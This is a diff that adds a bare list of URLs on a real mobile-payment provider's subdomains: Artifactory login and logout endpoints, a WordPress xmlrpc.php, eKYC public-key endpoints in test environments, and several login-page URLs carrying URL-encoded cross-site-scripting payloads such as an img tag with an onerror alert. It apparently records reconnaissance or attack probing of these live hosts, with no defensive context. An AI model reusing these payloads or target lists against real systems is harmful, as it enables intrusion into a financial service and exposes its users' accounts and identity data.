@@ -1,0 +1,13 @@
+https://artifactory.m-pesa.com/artifactory/webapp/saml/loginResponse?error=access_denied&error_subcode=cancel&state=423736d7-c776-446b-847b-cd906c0a3d91
+https://artifactory.m-pesa.com/ui/api/v1/ui/auth/logout
+https://artifactory.m-pesa.com/ui/api/v1/ui/auth/loginRelatedData
+https://business.m-pesa.com/xmlrpc.php
+https://mpa.ekyc.web.oat.m-pesa.com/ekyc-facade/v1/server/public-key
+https://mpa.ekyc.web.uat.m-pesa.com/ekyc-facade/v1/server/public-key
+https://portal.miniapps.tz.m-pesa.com/login?c=%3Cimg%20src=x%20onerror=alert(origin)%3E
+https://portal.miniapps.tz.m-pesa.com/login?goto=%3Cimg%20src=x%20onerror=alert%3E
+https://portal.miniapps.tz.m-pesa.com/login?goto=%3Cimg%20src=x%20onerror=%3E%3E
+https://portal.miniapps.tz.m-pesa.com/login?goto=%3Cimg%20src=x%20onerror=alert(origin)%3E
+https://portal.miniapps.tz.m-pesa.com/login?goto=%3Cimg%20src=x%3E
+https://portal.miniapps.tz.m-pesa.com/login?goto=%3Cimg%3E
+https://portal.miniapps.tz.m-pesa.com/login?q=%3Cimg%20src=x%20onerror=alert(origin)%3E
